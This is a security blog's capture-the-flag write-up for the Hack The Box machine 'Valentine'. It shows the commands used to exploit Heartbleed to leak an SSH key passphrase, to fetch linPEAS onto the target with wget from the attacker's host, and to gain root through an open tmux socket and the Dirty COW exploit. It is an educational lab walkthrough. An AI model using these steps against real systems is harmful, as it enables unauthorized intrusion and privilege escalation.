<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Valentine ‚Äî Hack The Box [Write-up]" /><meta name="author" content="0x3ashry" /><meta property="og:locale" content="en" /><meta name="description" content="Writeup for Valentine Hackthebox Machine" /><meta property="og:description" content="Writeup for Valentine Hackthebox Machine" /><link rel="canonical" href="https://0x3ashry.github.io/posts/Valentine-Hack-The-Box-Write-up/" /><meta property="og:url" content="https://0x3ashry.github.io/posts/Valentine-Hack-The-Box-Write-up/" /><meta property="og:site_name" content="0x3ashry‚Äôs Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-02-05T16:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Valentine ‚Äî Hack The Box [Write-up]" /><meta name="twitter:site" content="@0x3ashry" /><meta name="twitter:creator" content="@0x3ashry" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0x3ashry"},"dateModified":"2022-05-10T17:40:04+02:00","datePublished":"2021-02-05T16:00:00+02:00","description":"Writeup for Valentine Hackthebox Machine","headline":"Valentine ‚Äî Hack The Box [Write-up]","mainEntityOfPage":{"@type":"WebPage","@id":"https://0x3ashry.github.io/posts/Valentine-Hack-The-Box-Write-up/"},"url":"https://0x3ashry.github.io/posts/Valentine-Hack-The-Box-Write-up/"}</script><title>Valentine ‚Äî Hack The Box [Write-up] | 0x3ashry's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0x3ashry's Blog"><meta name="application-name" content="0x3ashry's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/favicons/android-chrome-512x512.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0x3ashry's Blog</a></div><div class="site-subtitle font-italic">CyberSecurity geek, who wants to share his day-to-day knowledge</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/0x3ashry" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0x3ashry" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['antony.magdy13','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Valentine ‚Äî Hack The Box [Write-up]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Valentine ‚Äî Hack The Box [Write-up]</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1612533600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 5, 2021 </em> </span> <span> Updated <em class="" data-ts="1652197204" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 10, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Antony Magdy </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1062 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/img/HTB/Valentine/Valentine.png" alt="" data-proofer-ignore></p><p>Valentine is a very unique machine which focuses on the Heartbleed vulnerability, which had devastating impact on systems across the globe.</p><p>Skills Required:</p><ul><li>Beginner/Intermediate knowledge of Linux</ul><p>Skills Learned:</p><ul><li>Identifying servers vulnerable to Heartbleed<li>Exploiting Heartbleed<li>Exploiting permissive tmux sessions</ul><p>Used Tools:</p><ul><li>Nmap<li>Gobuster or Dirsearch<li>Searchsploit<li>Openssl</ul><h2 id="1-scanning--enumeration"><span class="mr-2">1. SCANNING &amp; ENUMERATION</span><a href="#1-scanning--enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named ‚Äúnmap‚Äù and also show the output on the screen.</p><p><img data-src="/img/HTB/Valentine/img (1).png" alt="" data-proofer-ignore></p><p>We found 3 open ports: <strong>22 ‚Üí for SSH, 80 ‚Üí for HTTP, 443 ‚Üí for HTTPS</strong></p><p>We opened the website but nothing appears except a single photo in a full screen mode and it doesn‚Äôt hide anything in its source code‚Ä¶</p><p>So let‚Äôs enumerate the directories of the web application using gobuster‚Ä¶</p><p><img data-src="/img/HTB/Valentine/img (2).png" alt="" data-proofer-ignore></p><p>We found a directory called <strong>dev, encode, decode</strong> pages.</p><p>So let‚Äôs check the dev directory first‚Ä¶</p><p><img data-src="/img/HTB/Valentine/img (3).png" alt="" data-proofer-ignore></p><p>We found 2 interesting files <strong>hype_key</strong> and <strong>notes.txt</strong>, Let‚Äôs check notes.txt first‚Ä¶</p><p><img data-src="/img/HTB/Valentine/img (4).png" alt="" data-proofer-ignore></p><p>The author says it would be nice to fix the encoder/decoder, keep that in mind (and yes, you‚Äôd better find another way to take notes, bro üòà).</p><p>Let‚Äôs check hype_key‚Ä¶</p><p><img data-src="/img/HTB/Valentine/img (5).png" alt="" data-proofer-ignore></p><p>It contain a bunch of hex-decimals so let‚Äôs decode them using <strong>Hex to ASCII Text Converter</strong>:</p><p>After decoding them i found that this is <strong>private RSA key encrypted with a pass phrase</strong>, We can use it to connect to the server using SSH service‚Ä¶</p><p><img data-src="/img/HTB/Valentine/img (6).png" alt="" data-proofer-ignore></p><p>So we have to find the pass phrase to decrypt it.</p><p>Let‚Äôs check the encoder and decoder pages‚Ä¶</p><p><strong>/encode:</strong></p><p><img data-src="/img/HTB/Valentine/img (7).png" alt="" data-proofer-ignore></p><p>Entered ‚Äúhackthebox‚Äù:</p><p><img data-src="/img/HTB/Valentine/img (8).png" alt="" data-proofer-ignore></p><p><strong>/decode:</strong></p><p><img data-src="/img/HTB/Valentine/img (9).png" alt="" data-proofer-ignore></p><p>entered ‚ÄúaGFja3RoZWJveA==‚Äù</p><p><img data-src="/img/HTB/Valentine/img (10).png" alt="" data-proofer-ignore></p><p>The purpose of these pages isn‚Äôt clear yet, although i spent alot of time in it and found reflected XSS but it couldn‚Äôt be useful in our case So we had to find something else‚Ä¶</p><p>I couldn‚Äôt find any public exploits for any of the OpenSSH and Apache versions so what about the SSL version of port 443 let‚Äôs check if it is vulnerable‚Ä¶</p><p>I will use nmap scripts to do a full vulnerability scan on the SSL service:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap ‚Äî script ssl<span class="k">*</span> <span class="nt">-p</span> 443 10.10.10.79
</pre></table></code></div></div><p>we got a very long list of output but scrolling down i found something very interesting‚Ä¶</p><p><img data-src="/img/HTB/Valentine/img (11).png" alt="" data-proofer-ignore></p><p>This OpenSSL version is vulnerable to heartbleed which is is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</p><p>For more understanding of the vunerability i will refer to this sketch from xkcd comic :</p><p><img data-src="/img/HTB/Valentine/img (12).png" alt="Heartbleed Vulnerability" data-proofer-ignore></p><h2 id="2-exploitation"><span class="mr-2">2. EXPLOITATION</span><a href="#2-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>searchsploit heartbleed shows 4 exploits:</p><p><img data-src="/img/HTB/Valentine/img (13).png" alt="" data-proofer-ignore></p><p>I tried the last one‚Ä¶</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>searchsploit <span class="nt">-m</span> 32745
python 32745.py 10.10.10.79
</pre></table></code></div></div><p><img data-src="/img/HTB/Valentine/img (14).png" alt="Server Information Disclosure using Heartbleed" data-proofer-ignore></p><p>From the internal memory of the server, they pulled out a <code class="language-plaintext highlighter-rouge">lineaGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</code> that someone presumably entered into the decoder. Let‚Äôs translate into meaningful text:</p><p>We can use base64 to ascii online decoders or the Valentine decoder page or base64 command in linux as:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&lt;&lt;&lt;</span>‚ÄùaGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg<span class="o">==</span>‚Äù
</pre></table></code></div></div><p><img data-src="/img/HTB/Valentine/img (15).png" alt="" data-proofer-ignore></p><p>the decoding gives us a hint that it belong to the hype_key which we decode it and found that its an RSA encoded private key, So let‚Äôs try to decode it using this pass phrase‚Ä¶</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>openssl rsa <span class="nt">-in</span> rsa.key <span class="nt">-out</span> rsa_decrypted.key
</pre></table></code></div></div><p>rsa.key ‚Üí our private key</p><p>rsa_decrypted.key ‚Üí the output of the openssl</p><p><img data-src="/img/HTB/Valentine/img (16).png" alt="" data-proofer-ignore></p><p>he asked about the pass phrase and i write it, So let‚Äôs check the rsa_decrypted.key file‚Ä¶</p><p><img data-src="/img/HTB/Valentine/img (17).png" alt="" data-proofer-ignore></p><p>It is finally decrypted.</p><h3 id="ssh-connection"><span class="mr-2">SSH Connection:</span><a href="#ssh-connection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now we can connect to Valentine via SSH with a clear conscience (the username, by the way, had to be guessed, fortunately it was not difficult):</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh <span class="nt">-i</span> rsa_decrypted.key hype@10.10.10.79
</pre></table></code></div></div><p><img data-src="/img/HTB/Valentine/img (18).png" alt="" data-proofer-ignore></p><p>We connected successfully and BOOOOOOOOOOM !!! Now we had a user flag :D</p><h2 id="3-privilege-escalation"><span class="mr-2">3. PRIVILEGE ESCALATION:</span><a href="#3-privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="/img/HTB/Valentine/img (19).png" alt="Kernel Version" data-proofer-ignore></p><p>The kernel version hints at the possibility of using <strong>Dirty COW</strong> , but we will leave the dirty hacks as a last resort. Let‚Äôs run <em>linPEAS</em> which is a script that search for possible paths to escalate privileges on Linux/Unix* hosts:</p><p>But first we had to transfer it from our machine to the valentine‚Ä¶</p><ul><li>In Kali:</ul><p>open python server in the file that contain the linPEAS script</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python <span class="nt">-m</span> SimpleHTTPServer 8080
</pre></table></code></div></div><ul><li>In Valentine:</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wget http://10.10.16.130:8080/linpeas.sh
</pre></table></code></div></div><p><img data-src="/img/HTB/Valentine/img (20).png" alt="" data-proofer-ignore></p><p>Let‚Äôs give it the proper permissions and then execute the script‚Ä¶</p><p><img data-src="/img/HTB/Valentine/img (21).png" alt="Started linPEAS.sh" data-proofer-ignore></p><p>As expected a massive amount of information showed up, But one of the best things i like about linPEAS: its coloring system as firstly he said that the red color refers that You must take a look at it as a potential vulnerability and for more the red with yellow background refers that it is <strong>95% a vector</strong>.</p><p>First at the ‚ÄúBasic Information‚Äù part he colored the kernel version with red/yellow, YES i knew it, it is old version and has <strong>Dirty COW</strong></p><p><img data-src="/img/HTB/Valentine/img (22).png" alt="" data-proofer-ignore></p><p>but let‚Äôs continue‚Ä¶</p><p>STOP !!!!! we found a tmux opened session:</p><p><img data-src="/img/HTB/Valentine/img (23).png" alt="Tmux Opened Session" data-proofer-ignore></p><p><strong>tmux:</strong> this is a utility that allows you to manage terminal sessions, including ‚Äúfreezing‚Äù their current state with the possibility of subsequent resumption. What we will do is restore the paused session from the socket /.devs/dev_sess.</p><p>We‚Äôll connect with the same command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>tmux <span class="nt">-S</span> /.devs/dev_sess
</pre></table></code></div></div><p>Once we typed this command it opened the suspended tmux session with root privileges‚Ä¶</p><p><img data-src="/img/HTB/Valentine/img (24).png" alt="" data-proofer-ignore></p><p>BOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :D</p><h2 id="3-privilege-escalation--method-2"><span class="mr-2">3. PRIVILEGE ESCALATION ‚Äî Method 2</span><a href="#3-privilege-escalation--method-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>What about our Dirty COW üòà</p><p><strong>Dirty COW Vulnerability simply allows user to write on files meant to be read only.</strong></p><p>From the <em>Large number of PoC</em> I found <em>this</em> (based on changing the root entry in /etc/passwd) as the most stable and completely reversible.</p><p>Dirty.c allow us to generates a new password hash on the fly and modifies /etc/passwd automatically</p><p>First we‚Äôll transfer the dirty.c to the Valentine machine the same way we transfer linPEAS and then compile it‚Ä¶</p><p><img data-src="/img/HTB/Valentine/img (25).png" alt="" data-proofer-ignore></p><p><strong>1st ‚Üí We transfered dirty.c</strong></p><p><strong>2nd ‚Üí We compiled dirty.c to run on linux using gcc</strong></p><p><strong>3rd ‚Üí Run ./dirty and it simply do the following:</strong></p><p>1- Backup the passwd file to restore it once we finish our attack</p><p>2- Create a new user called <strong>firefart</strong> and ask you to enter his password</p><p>3- Update the passwd file with our new user</p><p>4- Remind you to restore the original state of the passwd file after escalating your privilege</p><p>Now let‚Äôs change the user to ‚Äúfirefart‚Äù, thereby granting ourselves superuser rights:</p><p><img data-src="/img/HTB/Valentine/img (26).png" alt="" data-proofer-ignore></p><p>BOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :D</p><p>Thank you so much for reading and I hope you learned a lot as I did ‚ù§</p><h4 id="0x3ashry"><span class="mr-2"><strong><em>0x3ashry</em></strong></span><a href="#0x3ashry" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Valentine+%E2%80%94+Hack+The+Box+%5BWrite-up%5D+-+0x3ashry%27s+Blog&url=https%3A%2F%2F0x3ashry.github.io%2Fposts%2FValentine-Hack-The-Box-Write-up%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Valentine+%E2%80%94+Hack+The+Box+%5BWrite-up%5D+-+0x3ashry%27s+Blog&u=https%3A%2F%2F0x3ashry.github.io%2Fposts%2FValentine-Hack-The-Box-Write-up%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2F0x3ashry.github.io%2Fposts%2FValentine-Hack-The-Box-Write-up%2F&text=Valentine+%E2%80%94+Hack+The+Box+%5BWrite-up%5D+-+0x3ashry%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Poison-Hack-The-Box-Write-up/">Poison ‚Äî Hack The Box [Write-up]</a><li><a href="/posts/BYUCTF-2022-Write-up/">BYUCTF 2022 [Write-up]</a><li><a href="/posts/Nest-Hack-The-Box-Write-up/">Nest ‚Äî Hack The Box [Write-up]</a><li><a href="/posts/Valentine-Hack-The-Box-Write-up/">Valentine ‚Äî Hack The Box [Write-up]</a><li><a href="/posts/Blunder-Hack-The-Box-Write-up/">Blunder ‚Äî Hack The Box [Write-up]</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/cryptography/">Cryptography</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/miscellaneous/">Miscellaneous</a> <a class="post-tag" href="/tags/web/">Web</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Sense-Hack-The-Box-Write-up/"><div class="card-body"> <em class="small" data-ts="1612245600" data-df="ll" > Feb 2, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Sense ‚Äî Hack The Box [Write-up]</h3><div class="text-muted small"><p> Sense, while not requiring many steps to complete, can be challenging for some as it is all about enumeration which takes long time for me then every thing goes easy as we will see. Used Tools: ...</p></div></div></a></div><div class="card"> <a href="/posts/Blunder-Hack-The-Box-Write-up/"><div class="card-body"> <em class="small" data-ts="1651381200" data-df="ll" > May 1, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Blunder ‚Äî Hack The Box [Write-up]</h3><div class="text-muted small"><p> Blunder is a Linux machine rated as easy from Hack The Box, it consists on finding credentials to log in to Bludit and then use a RCE exploit to gain an initial shell, then some database files ca...</p></div></div></a></div><div class="card"> <a href="/posts/Irked-Hack-The-Box-Write-up/"><div class="card-body"> <em class="small" data-ts="1651780800" data-df="ll" > May 5, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Irked ‚Äî Hack The Box [Write-up]</h3><div class="text-muted small"><p> This was an easy Linux box that involved exploiting malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive to get initial shell, Then exploiting a custom SUID binary to gai...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Sense-Hack-The-Box-Write-up/" class="btn btn-outline-primary" prompt="Older"><p>Sense ‚Äî Hack The Box [Write-up]</p></a> <a href="/posts/Blunder-Hack-The-Box-Write-up/" class="btn btn-outline-primary" prompt="Newer"><p>Blunder ‚Äî Hack The Box [Write-up]</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2022 <a href="https://twitter.com/username">Antony Magdy</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/cryptography/">Cryptography</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/miscellaneous/">Miscellaneous</a> <a class="post-tag" href="/tags/web/">Web</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer 